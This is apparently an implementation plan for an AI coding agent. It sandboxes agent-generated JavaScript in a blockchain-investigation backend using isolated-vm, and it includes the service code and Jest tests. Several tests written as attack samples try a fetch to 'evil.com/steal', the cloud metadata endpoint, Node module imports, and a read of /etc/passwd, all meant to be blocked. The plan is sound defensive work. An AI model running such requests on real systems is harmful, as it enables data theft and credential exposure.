# Sandbox Script Execution with `isolated-vm`

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Replace the unsandboxed `child_process.spawn()` script runner with a V8-isolate-based sandbox so agent-generated code cannot access the filesystem, spawn processes, or make unrestricted network requests.

**Architecture:** Agent-generated JavaScript currently runs in a bare Node.js child process that has full access to `fs`, `child_process`, `net`, and unrestricted `fetch()`. We replace `runInChildProcess()` in `ScriptExecutionService` with `runInIsolate()` using the `isolated-vm` npm package. The isolate gets only two bridged APIs: a domain-whitelisted `fetch()` and `console.log()`. Everything else (the `ScriptResult` return type, the `execute()` method signature, the DB persistence, the entity, the controller, the module wiring) stays identical.

**Tech Stack:** `isolated-vm` (V8 isolate), NestJS, Jest

---

## Atomized Changes

| # | File | Action | Purpose |
|---|------|--------|---------|
| 1 | `backend/package.json` | Modify | Add `isolated-vm` dependency |
| 2 | `backend/src/modules/ai/services/script-execution.service.ts` | Modify | Replace `runInChildProcess` with `runInIsolate` using V8 sandbox; add domain-whitelisted fetch bridge |
| 3 | `backend/src/modules/ai/services/script-execution.service.spec.ts` | Create | Tests proving sandbox blocks `fs`/`child_process`/`net`, allows whitelisted fetch, enforces timeout + memory limit |

**What does NOT change:** `ScriptResult` interface, `execute()` signature, `listRuns()`, `ScriptRunEntity`, `AiService`, `AiController`, `AiModule`, tool definitions, prompts, frontend.

---

## Task 1: Install `isolated-vm`

**Files:**
- Modify: `backend/package.json`

**Step 1: Install the package**

Run:
```bash
cd backend && npm install isolated-vm
```

**Step 2: Verify it installed and the native addon compiled**

Run:
```bash
cd backend && node -e "const ivm = require('isolated-vm'); const iso = new ivm.Isolate(); console.log('OK'); iso.dispose();"
```
Expected: `OK` (no errors — native addon built successfully)

**Step 3: Commit**

```bash
git add backend/package.json backend/package-lock.json
git commit -m "deps: add isolated-vm for script sandboxing"
```

---

## Task 2: Rewrite `runInChildProcess` → `runInIsolate`

**Files:**
- Modify: `backend/src/modules/ai/services/script-execution.service.ts`

This is the core change. We replace the `spawn()`-based runner with a V8 isolate that has:
- A `console` global (captures to a log buffer)
- A `fetch()` global (bridges to host-side fetch with domain whitelist)
- `process.env` object with only the allowed API keys
- 128MB memory limit
- 30s wall-clock timeout (wrapping the entire execution, including fetch waits)

**Step 1: Rewrite the service**

Replace the full contents of `script-execution.service.ts` with:

```typescript
import { Injectable } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { InjectRepository } from '@nestjs/typeorm';
import { Repository } from 'typeorm';
import * as ivm from 'isolated-vm';
import { ScriptRunEntity } from '../../../database/entities/script-run.entity';

const TIMEOUT_MS = 30_000;
const MAX_OUTPUT_BYTES = 100 * 1024; // 100KB
const MEMORY_LIMIT_MB = 128;

/**
 * Domains that agent scripts are allowed to fetch from.
 * Everything else is blocked at the bridge level.
 */
const ALLOWED_DOMAINS = [
  'api.etherscan.io',
  'api-sepolia.etherscan.io',
  'api-goerli.etherscan.io',
  'api-holesky.etherscan.io',
  'api.arbiscan.io',
  'api.basescan.org',
  'api-optimistic.etherscan.io',
  'api.polygonscan.com',
  'api.bscscan.com',
  'api.snowtrace.io',
  'api.ftmscan.com',
  'apilist.tronscanapi.com',
  'api.trongrid.io',
  'api.shasta.trongrid.io',
  'localhost',
  '127.0.0.1',
];

export interface ScriptResult {
  status: 'success' | 'error' | 'timeout';
  output: string;
  durationMs: number;
}

@Injectable()
export class ScriptExecutionService {
  constructor(
    private readonly configService: ConfigService,
    @InjectRepository(ScriptRunEntity)
    private readonly scriptRunRepo: Repository<ScriptRunEntity>,
  ) {}

  async execute(
    investigationId: string,
    name: string,
    code: string,
  ): Promise<ScriptResult & { savedRun: ScriptRunEntity }> {
    const result = await this.runInIsolate(code);

    const savedRun = await this.scriptRunRepo.save(
      this.scriptRunRepo.create({
        investigationId,
        name,
        code,
        output: result.output,
        status: result.status,
        durationMs: result.durationMs,
      }),
    );

    return { ...result, savedRun };
  }

  async listRuns(investigationId: string): Promise<ScriptRunEntity[]> {
    return this.scriptRunRepo.find({
      where: { investigationId },
      order: { createdAt: 'DESC' },
      take: 20,
    });
  }

  /**
   * Check whether a URL's hostname is in the allowed list.
   * Localhost is allowed so scripts can call back to the API_URL.
   */
  private isAllowedUrl(url: string): boolean {
    try {
      const parsed = new URL(url);
      return ALLOWED_DOMAINS.includes(parsed.hostname);
    } catch {
      return false;
    }
  }

  private async runInIsolate(code: string): Promise<ScriptResult> {
    const start = Date.now();
    const isolate = new ivm.Isolate({ memoryLimit: MEMORY_LIMIT_MB });

    try {
      return await this.executeInContext(isolate, code, start);
    } finally {
      if (!isolate.isDisposed) isolate.dispose();
    }
  }

  private executeInContext(
    isolate: ivm.Isolate,
    code: string,
    start: number,
  ): Promise<ScriptResult> {
    // Wall-clock timeout wrapping the entire execution (including fetch waits)
    return new Promise(async (resolve) => {
      let settled = false;
      const timer = setTimeout(() => {
        if (!settled) {
          settled = true;
          if (!isolate.isDisposed) isolate.dispose();
          resolve({
            status: 'timeout',
            output: logs.join('\n') + '\n...[killed: timeout after 30s]',
            durationMs: Date.now() - start,
          });
        }
      }, TIMEOUT_MS);

      const logs: string[] = [];
      let totalLogBytes = 0;

      const appendLog = (...args: unknown[]) => {
        if (totalLogBytes > MAX_OUTPUT_BYTES) return;
        const line = args.map(String).join(' ');
        totalLogBytes += Buffer.byteLength(line) + 1;
        if (totalLogBytes > MAX_OUTPUT_BYTES) {
          logs.push('...[truncated at 100KB]');
        } else {
          logs.push(line);
        }
      };

      try {
        const context = await isolate.createContext();
        const jail = context.global;

        // --- Inject console.log ---
        await jail.set(
          '_log',
          new ivm.Callback((...args: unknown[]) => appendLog(...args)),
        );
        await context.eval(
          `globalThis.console = { log: _log, error: _log, warn: _log, info: _log };`,
        );

        // --- Inject process.env (read-only subset) ---
        const envObj: Record<string, string> = {};
        const ethKey = this.configService.get<string>('ETHERSCAN_API_KEY');
        const tronKey = this.configService.get<string>('TRONSCAN_API_KEY');
        const apiUrl = this.configService.get<string>('API_URL') || 'http://localhost:8081';
        if (ethKey) envObj.ETHERSCAN_API_KEY = ethKey;
        if (tronKey) envObj.TRONSCAN_API_KEY = tronKey;
        envObj.API_URL = apiUrl;

        await jail.set(
          '_env',
          new ivm.ExternalCopy(envObj).copyInto(),
        );
        await context.eval(
          `globalThis.process = Object.freeze({ env: Object.freeze(_env) }); delete globalThis._env;`,
        );

        // --- Inject fetch bridge ---
        // The host-side function does the actual fetch and returns serialized data.
        // Domain whitelist is enforced here — the isolate cannot bypass it.
        await jail.set(
          '_fetchBridge',
          new ivm.Reference(async (url: string, optsJson: string) => {
            if (!this.isAllowedUrl(url)) {
              return new ivm.ExternalCopy({
                ok: false,
                status: 403,
                body: `Blocked: ${new URL(url).hostname} is not in the allowed domain list`,
              }).copyInto();
            }
            try {
              const opts = optsJson ? JSON.parse(optsJson) : {};
              const res = await fetch(url, opts);
              const body = await res.text();
              return new ivm.ExternalCopy({
                ok: res.ok,
                status: res.status,
                body,
              }).copyInto();
            } catch (err: any) {
              return new ivm.ExternalCopy({
                ok: false,
                status: 0,
                body: `Fetch error: ${err?.message ?? err}`,
              }).copyInto();
            }
          }),
        );

        await context.eval(`
          globalThis.fetch = async (url, opts = {}) => {
            const r = await _fetchBridge.apply(
              undefined,
              [String(url), JSON.stringify(opts)],
              { result: { promise: true } },
            );
            return {
              ok: r.ok,
              status: r.status,
              text: () => Promise.resolve(r.body),
              json: () => Promise.resolve(JSON.parse(r.body)),
            };
          };
          delete globalThis._fetchBridge;
        `);

        // --- Clean up injection helpers ---
        await context.eval(`delete globalThis._log;`);

        // --- Run agent code ---
        const harness = `
(async () => {
  try {
${code}
  } catch (err) {
    console.error(err?.message ?? String(err));
  }
})();
`.trim();

        await context.eval(harness, { timeout: TIMEOUT_MS, promise: true });

        if (!settled) {
          settled = true;
          clearTimeout(timer);
          const output = logs.join('\n').trim();
          resolve({
            status: 'success',
            output,
            durationMs: Date.now() - start,
          });
        }
      } catch (err: any) {
        if (!settled) {
          settled = true;
          clearTimeout(timer);
          const msg = err?.message ?? String(err);
          const isTimeout =
            msg.includes('disposed') ||
            msg.includes('Script execution timed out');
          const existingOutput = logs.join('\n');
          resolve({
            status: isTimeout ? 'timeout' : 'error',
            output: existingOutput
              ? `${existingOutput}\n${msg}`.trim()
              : msg,
            durationMs: Date.now() - start,
          });
        }
      }
    });
  }
}
```

**Step 2: Verify backend compiles**

Run:
```bash
cd backend && npx tsc --noEmit
```
Expected: No errors.

**Step 3: Manual smoke test**

Run the backend (`npm run be`) and send a chat message that triggers `execute_script`. Verify:
- A simple `console.log("hello")` script works
- A fetch to Etherscan works
- Output appears in the scripts panel

**Step 4: Commit**

```bash
git add backend/src/modules/ai/services/script-execution.service.ts
git commit -m "security: sandbox script execution with isolated-vm

Replace child_process.spawn with V8 isolate. Agent-generated code
now runs in an isolated V8 context with no access to fs, child_process,
net, os, or any Node.js API. Only a domain-whitelisted fetch() and
console.log are available."
```

---

## Task 3: Write tests proving the sandbox works

**Files:**
- Create: `backend/src/modules/ai/services/script-execution.service.spec.ts`

These tests validate the security properties of the sandbox — they are the proof that the isolation is real.

**Step 1: Write the test file**

```typescript
import { Test } from '@nestjs/testing';
import { ConfigService } from '@nestjs/config';
import { getRepositoryToken } from '@nestjs/typeorm';
import { ScriptExecutionService } from './script-execution.service';
import { ScriptRunEntity } from '../../../database/entities/script-run.entity';

const mockRepo = {
  find: jest.fn(),
  findOneBy: jest.fn(),
  create: jest.fn((dto) => dto),
  save: jest.fn((entity) => Promise.resolve({ id: 'run-1', ...entity })),
};

const mockConfig = {
  get: jest.fn((key: string) => {
    const env: Record<string, string> = {
      ETHERSCAN_API_KEY: 'test-eth-key',
      TRONSCAN_API_KEY: 'test-tron-key',
      API_URL: 'http://localhost:8081',
    };
    return env[key];
  }),
};

describe('ScriptExecutionService (sandbox)', () => {
  let service: ScriptExecutionService;

  beforeEach(async () => {
    jest.clearAllMocks();

    const module = await Test.createTestingModule({
      providers: [
        ScriptExecutionService,
        { provide: getRepositoryToken(ScriptRunEntity), useValue: mockRepo },
        { provide: ConfigService, useValue: mockConfig },
      ],
    }).compile();

    service = module.get(ScriptExecutionService);
  });

  // --- Basic execution ---

  it('runs simple console.log and captures output', async () => {
    const { status, output } = await service.execute('inv-1', 'test', 'console.log("hello world");');
    expect(status).toBe('success');
    expect(output).toContain('hello world');
  });

  it('captures multiple console.log calls', async () => {
    const code = `
      console.log("line 1");
      console.log("line 2");
      console.log("line 3");
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('line 1');
    expect(output).toContain('line 2');
    expect(output).toContain('line 3');
  });

  it('returns error status when code throws', async () => {
    const { status, output } = await service.execute(
      'inv-1',
      'test',
      'throw new Error("boom");',
    );
    expect(status).toBe('error');
    expect(output).toContain('boom');
  });

  // --- Sandbox isolation ---

  it('blocks fs access', async () => {
    const code = `
      try {
        const fs = await import('fs');
        console.log("ESCAPED: fs loaded");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  it('blocks child_process access', async () => {
    const code = `
      try {
        const cp = await import('child_process');
        console.log("ESCAPED: child_process loaded");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  it('blocks net access', async () => {
    const code = `
      try {
        const net = await import('net');
        console.log("ESCAPED: net loaded");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  it('blocks os access', async () => {
    const code = `
      try {
        const os = await import('os');
        console.log("ESCAPED: os loaded");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  it('has no access to require()', async () => {
    const code = `
      try {
        const m = require('fs');
        console.log("ESCAPED: require exists");
      } catch (e) {
        console.log("BLOCKED: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).not.toContain('ESCAPED');
    expect(output).toContain('BLOCKED');
  });

  // --- process.env ---

  it('exposes only whitelisted env vars', async () => {
    const code = `
      console.log("ETH:" + process.env.ETHERSCAN_API_KEY);
      console.log("TRON:" + process.env.TRONSCAN_API_KEY);
      console.log("API:" + process.env.API_URL);
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('ETH:test-eth-key');
    expect(output).toContain('TRON:test-tron-key');
    expect(output).toContain('API:http://localhost:8081');
  });

  it('does not expose HOST, PATH, or other system env vars', async () => {
    const code = `
      console.log("HOME:" + (process.env.HOME || "undefined"));
      console.log("PATH:" + (process.env.PATH || "undefined"));
      console.log("DATABASE_URL:" + (process.env.DATABASE_URL || "undefined"));
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('HOME:undefined');
    expect(output).toContain('PATH:undefined');
    expect(output).toContain('DATABASE_URL:undefined');
  });

  it('process.env is frozen (cannot be mutated)', async () => {
    const code = `
      try {
        process.env.ETHERSCAN_API_KEY = "hacked";
        console.log("MUTATED");
      } catch (e) {
        console.log("FROZEN: " + e.message);
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('FROZEN');
    expect(output).not.toContain('MUTATED');
  });

  // --- Fetch domain whitelist ---

  it('blocks fetch to non-whitelisted domains', async () => {
    const code = `
      const res = await fetch("https://evil.com/steal");
      const body = await res.text();
      console.log("status:" + res.status);
      console.log("body:" + body);
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('status:403');
    expect(output).toContain('Blocked');
  });

  it('blocks fetch to cloud metadata endpoint', async () => {
    const code = `
      const res = await fetch("http://169.254.169.254/latest/meta-data/");
      console.log("status:" + res.status);
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('status:403');
  });

  // --- Timeout ---

  it('kills scripts that exceed the timeout', async () => {
    const code = `
      while (true) {
        // infinite CPU loop
      }
    `;
    const { status } = await service.execute('inv-1', 'test', code);
    expect(status).toBe('timeout');
  }, 35_000);

  // --- Output limit ---

  it('truncates output exceeding 100KB', async () => {
    const code = `
      for (let i = 0; i < 50000; i++) {
        console.log("x".repeat(100));
      }
    `;
    const { output } = await service.execute('inv-1', 'test', code);
    expect(output).toContain('[truncated at 100KB]');
    expect(Buffer.byteLength(output)).toBeLessThanOrEqual(MAX_OUTPUT_BYTES + 200);
  });

  // --- DB persistence ---

  it('saves script run to database', async () => {
    await service.execute('inv-1', 'my-script', 'console.log("saved");');
    expect(mockRepo.create).toHaveBeenCalledWith(
      expect.objectContaining({
        investigationId: 'inv-1',
        name: 'my-script',
        code: 'console.log("saved");',
        status: 'success',
      }),
    );
    expect(mockRepo.save).toHaveBeenCalled();
  });
});

// Re-export for the truncation test
const MAX_OUTPUT_BYTES = 100 * 1024;
```

**Step 2: Run the tests**

Run:
```bash
cd backend && npx jest src/modules/ai/services/script-execution.service.spec.ts --verbose
```
Expected: All tests pass. The critical ones are the "blocks fs/child_process/net/os" tests — these prove the sandbox is real.

**Step 3: Commit**

```bash
git add backend/src/modules/ai/services/script-execution.service.spec.ts
git commit -m "test: prove sandbox blocks fs, child_process, net, os and enforces domain whitelist"
```

---

## Task 4: End-to-end smoke test

This is a manual verification that the full agent loop works with the new sandbox.

**Step 1: Start the backend**

Run:
```bash
npm run be
```

**Step 2: Test via the UI**

Open the app, go to an investigation, and send a message like:
> "What is the ETH balance of vitalik.eth?"

Verify:
- The agent calls `get_skill` to load blockchain-apis
- The agent calls `execute_script` with a fetch to Etherscan
- The script succeeds and returns data
- The result appears in the chat and scripts panel

**Step 3: Test a blocked script via rerun**

Find a completed script run and edit its code in the DB (or create a test endpoint) to try:
```js
const fs = await import('fs');
console.log(fs.readFileSync('/etc/passwd', 'utf-8'));
```

Verify it returns an error, not the file contents.

---

## Notes

### What this changes
- **One file modified:** `script-execution.service.ts` — `runInChildProcess` → `runInIsolate`
- **One file created:** `script-execution.service.spec.ts` — sandbox proof tests
- **One dependency added:** `isolated-vm`

### What this does NOT change
- `ScriptResult` interface — identical
- `execute()` / `listRuns()` method signatures — identical
- `ScriptRunEntity` — identical
- `AiService` tool dispatch — identical
- `AiController` rerun endpoint — identical
- `AiModule` wiring — identical
- Frontend — identical
- Agent prompts / tool descriptions — identical

### Domain whitelist maintenance
The `ALLOWED_DOMAINS` array in the service is the single source of truth for which domains agent scripts can reach. When adding support for new blockchain APIs, add their domains here. The localhost entries allow scripts to call back to the backend's own API (for graph mutations via the import endpoint).
